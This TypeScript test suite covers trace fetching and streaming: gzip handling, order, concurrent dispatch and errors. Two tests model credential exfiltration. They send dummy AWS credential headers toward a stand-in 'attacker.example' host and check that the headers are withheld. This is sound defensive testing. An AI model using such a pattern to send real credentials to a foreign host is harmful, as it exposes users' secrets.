// Tests for fetchTraces: the `trace=` query parameter is repeatable, and each
// component is fetched and gunzipped independently before concatenation.
//
// Migrated from test_fetch_traces.js (T11); frozen core loaded via
// createRequire (see format.test.ts for the rationale). The fetch/location
// mocks keep the original's install-in-try / restore-in-finally shape.

import { describe, it, expect, beforeAll } from "vitest";
import { createRequire } from "node:module";
import { deepStrictEqual } from "node:assert";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { gunzipSync, gzipSync } from "node:zlib";

const require = createRequire(import.meta.url);

type ByteSource = Buffer | Uint8Array;

interface FetchOpts {
  headers?: Record<string, string>;
}

interface ParsedTraceLike {
  events: unknown[];
}

const { fetchTraces, fetchTracesStream, parseTrace, parseTraceStream } =
  require("../../trace_parser.js") as {
    fetchTraces: (
      urls: string | string[],
      opts?: FetchOpts,
    ) => Promise<Uint8Array>;
    fetchTracesStream: (
      urls: string[],
      opts?: FetchOpts,
    ) => AsyncIterable<Uint8Array>;
    parseTrace: (buf: ByteSource) => Promise<ParsedTraceLike>;
    parseTraceStream: (
      chunks: AsyncIterable<Uint8Array>,
    ) => Promise<ParsedTraceLike>;
  };

const globalAny = globalThis as {
  fetch: unknown;
  location?: unknown;
};

// Drain an async iterable of Uint8Array chunks into one contiguous Uint8Array.
async function collectChunks(iterable: AsyncIterable<Uint8Array>): Promise<Uint8Array> {
  const chunks: Uint8Array[] = [];
  let total = 0;
  for await (const c of iterable) {
    const u8 = c instanceof Uint8Array ? c : new Uint8Array(c);
    chunks.push(u8);
    total += u8.length;
  }
  const out = new Uint8Array(total);
  let off = 0;
  for (const c of chunks) {
    out.set(c, off);
    off += c.length;
  }
  return out;
}

interface RecordedCall {
  url: string;
  opts?: FetchOpts;
}

interface FetchMockRestore {
  (): void;
  calls: RecordedCall[];
}

// Minimal fetch() mock: maps a URL → bytes (Buffer/Uint8Array) and returns a
// Response-like object exposing arrayBuffer(). Supports an error URL too.
// Records the second (options) argument of each call so tests can assert that
// headers are forwarded.
function installFetchMock(urlToBytes: Record<string, ByteSource>): FetchMockRestore {
  const original = globalAny.fetch;
  const calls: RecordedCall[] = [];
  globalAny.fetch = async (url: string, opts?: FetchOpts) => {
    calls.push({ url, opts });
    if (!(url in urlToBytes)) {
      return {
        ok: false,
        status: 404,
        async arrayBuffer() {
          return new ArrayBuffer(0);
        },
      };
    }
    const bytes = urlToBytes[url]!;
    const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
    return {
      ok: true,
      status: 200,
      async arrayBuffer() {
        return u8.buffer.slice(u8.byteOffset, u8.byteOffset + u8.byteLength);
      },
    };
  };
  const restore = () => {
    globalAny.fetch = original;
  };
  restore.calls = calls;
  return restore;
}

// Normalize to a plain Uint8Array so deep equality doesn't trip on the
// Buffer-vs-Uint8Array type tag (Node Buffers are Uint8Array subclasses).
function bytesOf(buf: ByteSource | ArrayBuffer): Uint8Array {
  const u8 = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
  return Uint8Array.from(u8);
}

// Multi-megabyte byte arrays are compared with node:assert's deepStrictEqual
// (as the original did): vitest's toEqual routes through chai's deep-eql,
// which walks the arrays element-by-element and is unusably slow at this size.
function expectBytesEqual(actual: Uint8Array, expected: Uint8Array): void {
  deepStrictEqual(actual, expected);
}

const tracePath = fileURLToPath(
  new URL("../../public/demo-trace.bin", import.meta.url),
);

let rawTrace: Buffer;
let gzTrace: Buffer;
let singleEvents: number;

beforeAll(async () => {
  const fileBytes = readFileSync(tracePath);
  rawTrace =
    fileBytes[0] === 0x1f && fileBytes[1] === 0x8b
      ? gunzipSync(fileBytes)
      : Buffer.from(fileBytes);
  gzTrace = gzipSync(rawTrace);

  // Reference parse of a single raw trace.
  const single = await parseTrace(rawTrace);
  singleEvents = single.events.length;
});

describe("fetchTraces", { timeout: 60_000 }, () => {
  // ── Test 1: single raw URL round-trips unchanged ──
  it("single raw component", async () => {
    const restore = installFetchMock({ "/a": rawTrace });
    try {
      const buf = await fetchTraces("/a");
      expectBytesEqual(bytesOf(buf), bytesOf(rawTrace));
    } finally {
      restore();
    }
  });

  // ── Test 2: single gzipped URL is ungzipped to raw bytes ──
  it("single gzipped component is ungzipped", async () => {
    const restore = installFetchMock({ "/a.gz": gzTrace });
    try {
      const buf = await fetchTraces(["/a.gz"]);
      expectBytesEqual(bytesOf(buf), bytesOf(rawTrace));
    } finally {
      restore();
    }
  });

  // ── Test 3: mixed gzipped + raw components, each ungzipped individually,
  //    then concatenated in order. The concatenated stream must parse as one
  //    trace with double the events (decoder resets on mid-stream TRC\0). ──
  it("mixed gzip/raw components concatenate and parse", async () => {
    const restore = installFetchMock({ "/gz": gzTrace, "/raw": rawTrace });
    try {
      const buf = await fetchTraces(["/gz", "/raw"]);
      const expectedLen = rawTrace.length * 2;
      expect(buf.byteLength, "concatenated length").toBe(expectedLen);
      // First half == raw trace, second half == raw trace.
      const out = bytesOf(buf);
      expectBytesEqual(out.slice(0, rawTrace.length), bytesOf(rawTrace));
      expectBytesEqual(out.slice(rawTrace.length), bytesOf(rawTrace));

      const parsed = await parseTrace(buf);
      expect(
        parsed.events.length,
        `expected ${singleEvents * 2} events, got ${parsed.events.length}`,
      ).toBe(singleEvents * 2);
    } finally {
      restore();
    }
  });

  // ── Test 4: order is preserved ──
  it("component order is preserved", async () => {
    const a = new Uint8Array([1, 2, 3]);
    const b = new Uint8Array([4, 5]);
    const c = new Uint8Array([6]);
    const restore = installFetchMock({ "/a": a, "/b": b, "/c": c });
    try {
      const buf = await fetchTraces(["/a", "/b", "/c"]);
      expect(bytesOf(buf)).toEqual(new Uint8Array([1, 2, 3, 4, 5, 6]));
    } finally {
      restore();
    }
  });

  // ── Test 5b: opts.headers are forwarded to every fetch (BYO credentials) ──
  it("headers are forwarded to each fetch", async () => {
    const restore = installFetchMock({ "/a": rawTrace, "/b": rawTrace });
    try {
      const headers = { "x-dial9-aws-access-key-id": "AKIA" };
      await fetchTraces(["/a", "/b"], { headers });
      expect(restore.calls.length, "two fetches issued").toBe(2);
      for (const call of restore.calls) {
        expect(call.opts, "fetch received an options arg").toBeTruthy();
        expect(call.opts!.headers, "headers forwarded").toEqual(headers);
      }
    } finally {
      restore();
    }
  });

  // ── Test 5c: credential headers are withheld from cross-origin URLs ──
  // A crafted `?trace=https://attacker/` must NOT receive the AWS credential
  // headers, or it would exfiltrate the user's credentials to a foreign host.
  it("credential headers are withheld from cross-origin URLs", async () => {
    const restore = installFetchMock({
      "/api/trace?keys=seg": rawTrace,
      "https://attacker.example/x": rawTrace,
    });
    // Simulate a browser served from https://dial9.example.
    const originalLocation = globalAny.location;
    globalAny.location = {
      origin: "https://dial9.example",
      href: "https://dial9.example/viewer.html",
    };
    try {
      const headers = {
        "x-dial9-aws-access-key-id": "AKIA",
        "x-dial9-aws-secret-access-key": "shh",
      };
      await fetchTraces(["/api/trace?keys=seg", "https://attacker.example/x"], {
        headers,
      });
      expect(restore.calls.length, "two fetches issued").toBe(2);

      const sameOrigin = restore.calls.find((c) => c.url === "/api/trace?keys=seg");
      const crossOrigin = restore.calls.find(
        (c) => c.url === "https://attacker.example/x",
      );

      expect(
        sameOrigin!.opts!.headers,
        "same-origin request keeps credentials",
      ).toEqual(headers);
      expect(
        crossOrigin!.opts!.headers,
        "cross-origin request must NOT carry credential headers",
      ).toBeUndefined();
    } finally {
      restore();
      globalAny.location = originalLocation;
    }
  });

  // ── Test 5: a failed component rejects with an informative error ──
  it("failed fetch rejects", async () => {
    const restore = installFetchMock({ "/ok": rawTrace });
    try {
      let threw = false;
      try {
        await fetchTraces(["/ok", "/missing"]);
      } catch (e) {
        threw = true;
        expect(
          /404/.test((e as Error).message),
          `error mentions status: ${(e as Error).message}`,
        ).toBe(true);
      }
      expect(threw, "expected fetchTraces to reject").toBe(true);
    } finally {
      restore();
    }
  });
});

// ── fetchTracesStream: streams components back-to-back as one trace ──
describe("fetchTracesStream", { timeout: 60_000 }, () => {
  // Concatenated stream is byte-identical to the buffered fetchTraces output,
  // and parses (via parseTraceStream) to the same event count.
  it("concatenation matches fetchTraces", async () => {
    const restore = installFetchMock({ "/gz": gzTrace, "/raw": rawTrace });
    try {
      const streamed = await collectChunks(fetchTracesStream(["/gz", "/raw"]));
      const buffered = bytesOf(await fetchTraces(["/gz", "/raw"]));
      // "streamed bytes == buffered bytes"
      expectBytesEqual(streamed, buffered);

      const parsed = await parseTraceStream(fetchTracesStream(["/gz", "/raw"]));
      expect(
        parsed.events.length,
        `expected ${singleEvents * 2} events, got ${parsed.events.length}`,
      ).toBe(singleEvents * 2);
    } finally {
      restore();
    }
  });

  // Components are emitted strictly in `urls` order even though the fetches run
  // concurrently (a later, faster component must not jump the queue).
  it("preserves order", async () => {
    const a = new Uint8Array([1, 2, 3]);
    const b = new Uint8Array([4, 5]);
    const c = new Uint8Array([6]);
    const restore = installFetchMock({ "/a": a, "/b": b, "/c": c });
    try {
      const out = await collectChunks(fetchTracesStream(["/a", "/b", "/c"]));
      expect(out).toEqual(new Uint8Array([1, 2, 3, 4, 5, 6]));
    } finally {
      restore();
    }
  });

  // The whole point of #595: all component fetches are dispatched up front (so
  // downloads run concurrently and overlap the parse), NOT one-after-another as
  // each stream is drained. Calling fetchTracesStream must issue every fetch()
  // synchronously, before any chunk is consumed.
  it("dispatches all fetches concurrently", async () => {
    const restore = installFetchMock({
      "/a": rawTrace,
      "/b": rawTrace,
      "/c": rawTrace,
    });
    try {
      const iterable = fetchTracesStream(["/a", "/b", "/c"]);
      // No chunk has been consumed yet, but all three fetches should already
      // be in flight (fetchTraceStream calls fetch() synchronously before its
      // first await, and fetchTracesStream maps over all URLs eagerly).
      expect(
        restore.calls.length,
        `expected 3 concurrent fetches before consuming, got ${restore.calls.length}`,
      ).toBe(3);
      // Draining still works after the fact.
      const out = await collectChunks(iterable);
      expect(out.length, "all three components drained").toBe(rawTrace.length * 3);
    } finally {
      restore();
    }
  });

  // Credential headers follow the same same-origin rule as fetchTraces.
  it("withholds credentials cross-origin", async () => {
    const restore = installFetchMock({
      "/api/object?key=seg": rawTrace,
      "https://attacker.example/x": rawTrace,
    });
    const originalLocation = globalAny.location;
    globalAny.location = {
      origin: "https://dial9.example",
      href: "https://dial9.example/viewer.html",
    };
    try {
      const headers = {
        "x-dial9-aws-access-key-id": "AKIA",
        "x-dial9-aws-secret-access-key": "shh",
      };
      await collectChunks(
        fetchTracesStream(
          ["/api/object?key=seg", "https://attacker.example/x"],
          { headers },
        ),
      );
      const sameOrigin = restore.calls.find((c) => c.url === "/api/object?key=seg");
      const crossOrigin = restore.calls.find(
        (c) => c.url === "https://attacker.example/x",
      );
      expect(sameOrigin!.opts!.headers, "same-origin keeps credentials").toEqual(
        headers,
      );
      expect(
        crossOrigin!.opts!.headers,
        "cross-origin withholds credentials",
      ).toBeUndefined();
    } finally {
      restore();
      globalAny.location = originalLocation;
    }
  });

  // A later component that fails (e.g. 404) while an earlier one is still
  // resolving must (a) reject the iterator when emission reaches it, and (b) NOT
  // leave a transient unhandled rejection (which fires the browser's
  // `unhandledrejection` event / Node's unhandledRejection). The eager-dispatch
  // design attaches a no-op catch to each fetch promise to prevent (b).
  //
  // The window only opens across a REAL macrotask gap: component 0 must take a
  // timer to resolve so that, while we await it, the microtask queue drains and
  // Node runs its unhandled-rejection check with component 1 still un-awaited.
  // A synchronous one-shot reader would award component 1 within microtasks and
  // mask the bug, so this uses a body whose first read resolves via setTimeout.
  it("late failure rejects without unhandled rejection", async () => {
    // /slow: streams rawTrace, but its first read lands on a real timer.
    // /late: 404s after one microtask. /slow is index 0, /late is index 1.
    const originalFetch = globalAny.fetch;
    globalAny.fetch = async (url: string) => {
      if (url === "/late") {
        return {
          ok: false,
          status: 404,
          async arrayBuffer() {
            return new ArrayBuffer(0);
          },
        };
      }
      let sent = false;
      return {
        ok: true,
        status: 200,
        body: {
          getReader() {
            return {
              async read() {
                if (sent) return { done: true, value: undefined };
                sent = true;
                await new Promise((r) => setTimeout(r, 20)); // macrotask gap
                return { done: false, value: rawTrace };
              },
              async cancel() {},
            };
          },
        },
      };
    };
    let unhandled = 0;
    const onUnhandled = () => {
      unhandled++;
    };
    process.on("unhandledRejection", onUnhandled);
    try {
      let threw = false;
      try {
        await collectChunks(fetchTracesStream(["/slow", "/late"]));
      } catch (e) {
        threw = true;
        expect(
          /404/.test((e as Error).message),
          `error mentions status: ${(e as Error).message}`,
        ).toBe(true);
      }
      expect(threw, "expected the iterator to reject").toBe(true);
      // Let any stray microtask/macrotask-deferred rejection settle.
      await new Promise((r) => setTimeout(r, 10));
      expect(unhandled, `expected 0 unhandled rejections, got ${unhandled}`).toBe(0);
    } finally {
      globalAny.fetch = originalFetch;
      process.removeListener("unhandledRejection", onUnhandled);
    }
  });
});
